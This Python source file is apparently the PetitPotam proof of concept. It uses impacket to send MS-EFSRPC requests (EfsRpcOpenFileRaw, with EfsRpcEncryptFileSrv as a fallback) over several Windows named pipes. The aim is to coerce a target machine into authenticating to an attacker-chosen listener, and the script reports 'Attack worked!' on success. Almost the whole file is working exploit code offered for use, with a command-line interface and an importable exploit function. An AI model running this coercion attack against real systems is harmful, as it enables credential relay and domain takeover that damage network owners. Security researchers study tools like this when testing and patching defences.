#!/usr/bin/env python3
'''
#
# Author: GILLES Lionel aka topotam (@topotam77)
#
# Greetz : grenadine(@Greynardine), skar(@__skar), didakt(@inf0sec1), plissken, pixis(@HackAndDo)
# "Most of" the code stolen from dementor.py from @3xocyte ;)
'''

import sys
import argparse
from getpass import getpass

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD, BOOL, PCHAR, RPC_SID, LPWSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code


################################################################################
# STRUCTURES
################################################################################
class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    '''STRUCTURE CLASS FOR EXIMPORT_CONTEXT_HANDLE'''
    align = 1
    structure = (
        ('Data', '20s'),
    )
class EFS_EXIM_PIPE(NDRSTRUCT):
    '''STRUCTURE CLASS FOR EFS_EXIM_PIPE'''
    align = 1
    structure = (
        ('Data', ':'),
    )
class EFS_HASH_BLOB(NDRSTRUCT):
    '''STRUCTURE CLASS FOR EFS_HASH_BLOB'''
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
class EFS_RPC_BLOB(NDRSTRUCT):
    '''STRUCTURE CLASS FOR EFS_RPC_BLOB'''
    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )

class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
    '''STRUCTURE CLASS FOR EFS_CERTIFICATE_BLOB'''
    structure = (
        ('Type', DWORD),
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    '''STRUCTURE CLASS FOR ENCRYPTION_CERTIFICATE_HASH'''
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_HASH_BLOB),
        ('Display', LPWSTR),
    )
class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
    '''STRUCTURE CLASS FOR ENCRYPTION_CERTIFICATE'''
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_CERTIFICATE_BLOB),

    )
class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    '''STRUCTURE CLASS FOR ENCRYPTION_CERTIFICATE_HASH_LIST'''
    align = 1
    structure = (
        ('Cert', DWORD),
        ('Users', ENCRYPTION_CERTIFICATE_HASH),
    )
class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):
    '''STRUCTURE CLASS FOR ENCRYPTED_FILE_METADATA_SIGNATURE'''
    structure = (
        ('Type', DWORD),
        ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),
        ('Certif', ENCRYPTION_CERTIFICATE),
        ('Blob', EFS_RPC_BLOB),
    )

class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    '''STRUCTURE CLASS ENCRYPTION_CERTIFICATE_LIST'''
    align = 1
    structure = (
        ('Data', ':'),
    )

################################################################################
# RPC CALLS
################################################################################
class EfsRpcOpenFileRaw(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcOpenFileRaw'''
    opnum = 0
    structure = (
        ('fileName', WSTR),
        ('Flag', ULONG),
    )

class EfsRpcOpenFileRawResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcOpenFileRawResponse'''
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
        ('ErrorCode', ULONG),
    )
class EfsRpcEncryptFileSrv(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcEncryptFileSrv'''
    opnum = 4
    structure = (
        ('FileName', WSTR),
    )

class EfsRpcEncryptFileSrvResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcEncryptFileSrvResponse'''

    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcDecryptFileSrv(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcDecryptFileSrv'''
    opnum = 5
    structure = (
        ('FileName', WSTR),
        ('Flag', ULONG),
    )

class EfsRpcDecryptFileSrvResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcDecryptFileSrvResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcQueryUsersOnFile(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcQueryUsersOnFile'''
    opnum = 6
    structure = (
        ('FileName', WSTR),

    )
class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcQueryUsersOnFileResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcQueryRecoveryAgents(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcQueryRecoveryAgents'''
    opnum = 7
    structure = (
        ('FileName', WSTR),

    )
class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcQueryRecoveryAgentsResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcRemoveUsersFromFile(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcRemoveUsersFromFile'''
    opnum = 8
    structure = (
        ('FileName', WSTR),
        ('Users', ENCRYPTION_CERTIFICATE_HASH_LIST)

    )
class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcRemoveUsersFromFileResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcAddUsersToFile(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcAddUsersToFile'''
    opnum = 9
    structure = (
        ('FileName', WSTR),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST)

    )
class EfsRpcAddUsersToFileResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcAddUsersToFileResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcFileKeyInfo(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcFileKeyInfo'''
    opnum = 12
    structure = (
        ('FileName', WSTR),
        ('infoClass', DWORD),
    )
class EfsRpcFileKeyInfoResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcFileKeyInfoResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcDuplicateEncryptionInfoFile'''
    opnum = 13
    structure = (
        ('SrcFileName', WSTR),
        ('DestFileName', WSTR),
        ('dwCreationDisposition', DWORD),
        ('dwAttributes', DWORD),
        ('RelativeSD', EFS_RPC_BLOB),
        ('bInheritHandle', BOOL),
    )

class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcDuplicateEncryptionInfoFileResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcAddUsersToFileEx(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcAddUsersToFileEx'''
    opnum = 15
    structure = (
        ('dwFlags', DWORD),
        ('Reserved', EFS_RPC_BLOB),
        ('FileName', WSTR),
        ('dwAttributes', DWORD),
        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),
    )

class EfsRpcAddUsersToFileExResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcAddUsersToFileExResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcFileKeyInfoEx(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcFileKeyInfoEx'''
    opnum = 16
    structure = (
        ('dwFileKeyInfoFlags', DWORD),
        ('Reserved', EFS_RPC_BLOB),
        ('FileName', WSTR),
        ('InfoClass', DWORD),
    )
class EfsRpcFileKeyInfoExResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcFileKeyInfoExResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcGetEncryptedFileMetadata(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcGetEncryptedFileMetadata'''
    opnum = 18
    structure = (
        ('FileName', WSTR),
    )
class EfsRpcGetEncryptedFileMetadataResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcGetEncryptedFileMetadataResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcSetEncryptedFileMetadata(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcSetEncryptedFileMetadata'''
    opnum = 19
    structure = (
        ('FileName', WSTR),
        ('OldEfsStreamBlob', EFS_RPC_BLOB),
        ('NewEfsStreamBlob', EFS_RPC_BLOB),
        ('NewEfsSignature', ENCRYPTED_FILE_METADATA_SIGNATURE),
    )
class EfsRpcSetEncryptedFileMetadataResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcSetEncryptedFileMetadataResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
class EfsRpcEncryptFileExSrv(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcEncryptFileExSrv'''
    opnum = 21
    structure = (
        ('FileName', WSTR),
        ('ProtectorDescriptor', WSTR),
        ('Flags', ULONG),
    )
class EfsRpcEncryptFileExSrvResponse(NDRCALL):
    '''STRUCTURE CLASS FOR RPC CALLS: EfsRpcEncryptFileExSrvResponse'''
    structure = (
        ('ErrorCode', ULONG),
    )
#class EfsRpcQueryProtectors(NDRCALL):
#    opnum = 21
#    structure = (
#        ('FileName', WSTR),
#        ('ppProtectorList', PENCRYPTION_PROTECTOR_LIST),
#    )
#class EfsRpcQueryProtectorsResponse(NDRCALL):
#    structure = (
#        ('ErrorCode', ULONG),
#    )

################################################################################
# OPNUMs and their corresponding structures
################################################################################
OPNUMS = {
    0   : (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),
    4   : (EfsRpcEncryptFileSrv, EfsRpcEncryptFileSrvResponse),
    5   : (EfsRpcDecryptFileSrv, EfsRpcDecryptFileSrvResponse),
    6   : (EfsRpcQueryUsersOnFile, EfsRpcQueryUsersOnFileResponse),
    7   : (EfsRpcQueryRecoveryAgents, EfsRpcQueryRecoveryAgentsResponse),
    8   : (EfsRpcRemoveUsersFromFile, EfsRpcRemoveUsersFromFileResponse),
    9   : (EfsRpcAddUsersToFile, EfsRpcAddUsersToFileResponse),
    12   : (EfsRpcFileKeyInfo, EfsRpcFileKeyInfoResponse),
    13   : (EfsRpcDuplicateEncryptionInfoFile, EfsRpcDuplicateEncryptionInfoFileResponse),
    15   : (EfsRpcAddUsersToFileEx, EfsRpcAddUsersToFileExResponse),
    16   : (EfsRpcFileKeyInfoEx, EfsRpcFileKeyInfoExResponse),
    18   : (EfsRpcGetEncryptedFileMetadata, EfsRpcGetEncryptedFileMetadataResponse),
    19   : (EfsRpcSetEncryptedFileMetadata, EfsRpcSetEncryptedFileMetadataResponse),
    21   : (EfsRpcEncryptFileExSrv, EfsRpcEncryptFileExSrvResponse),
#    22   : (EfsRpcQueryProtectors, EfsRpcQueryProtectorsResponse),
}

class CoerceAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost, targetIp):
        binding_params = {
            'lsarpc': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\lsarpc]',
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'efsr': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\efsrpc]',
                'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')
            },
            'samr': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\samr]',
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'lsass': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\lsass]',
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'netlogon': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\netlogon]',
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp:
            rpctransport.setRemoteHost(targetIp)

        dce = rpctransport.get_dce_rpc()
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        print(f"[-] Connecting to {binding_params[pipe]['stringBinding']}")
        try:
            dce.connect()
        except Exception as e:
            print(f"Something went wrong, check error status => {str(e)}")
            #sys.exit()
            return
        print("[+] Connected!")
        print(f"[+] Binding to {binding_params[pipe]['MSRPC_UUID_EFSR'][0]}")
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
        except Exception as e:
            print(f"Something went wrong, check error status => {e}")
            #sys.exit()
            return
        print("[+] Successfully bound!")
        return dce

    def EfsRpcOpenFileRaw(self, dce, listener):
        print("[-] Sending EfsRpcOpenFileRaw!")
        try:
            request = EfsRpcOpenFileRaw()
            request['fileName'] = f'\\\\{listener}\\test\\Settings.ini\x00'
            request['Flag'] = 0
            #request.dump()
            resp = dce.request(request)

        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked!')
                #sys.exit()
                return None
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
                print('[+] OK! Using unpatched function!')
                print("[-] Sending EfsRpcEncryptFileSrv!")
                try:
                    request = EfsRpcEncryptFileSrv()
                    request['FileName'] = f'\\\\{listener}\\test\\Settings.ini\x00'
                    resp = dce.request(request)
                except Exception:
                    if str(Exception).find('ERROR_BAD_NETPATH') >= 0:
                        print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                        print('[+] Attack worked!')
                        # pass
                    else:
                        print(f"Something went wrong, check error status => {Exception}")
                        return None
                        #sys.exit()

            else:
                print(f"Something went wrong, check error status => {str(e)}")
                return None
                #sys.exit()

def exploit(username, password, domain, lmhash, nthash, target, pipe, target_ip, dc_ip, listener_ip, kerberos=None):
    '''Function exploit to import it from python file if needed'''
    plop = CoerceAuth()
    if pipe == "all":
        all_pipes = ['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass']
    else:
        all_pipes = ['lsarpc']

    for all_pipe in all_pipes:
        print("Trying pipe", all_pipe)
        dce = plop.connect(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, target=target, pipe=all_pipe, doKerberos=kerberos, dcHost=dc_ip, targetIp=target_ip)
        if dce is not None:
            plop.EfsRpcOpenFileRaw(dce, listener_ip)
            dce.disconnect()

def main():
    parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')

    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line')
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                        'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')

    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass', 'all'], default='lsarpc', help='Named pipe to use (default: lsarpc) or all')
    parser.add_argument('listener', help='ip address or hostname of listener')
    parser.add_argument('target', help='ip address or hostname of target')
    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        options.password = getpass("Password:")

    plop = CoerceAuth()

    if options.pipe == "all":
        all_pipes = ['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass']
    else:
        all_pipes = [options.pipe]

    for all_pipe in all_pipes:
        print("Trying pipe", all_pipe)
        dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=all_pipe, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
        if dce is not None:
            plop.EfsRpcOpenFileRaw(dce, options.listener)
            dce.disconnect()
    sys.exit()

if __name__ == '__main__':
    main()
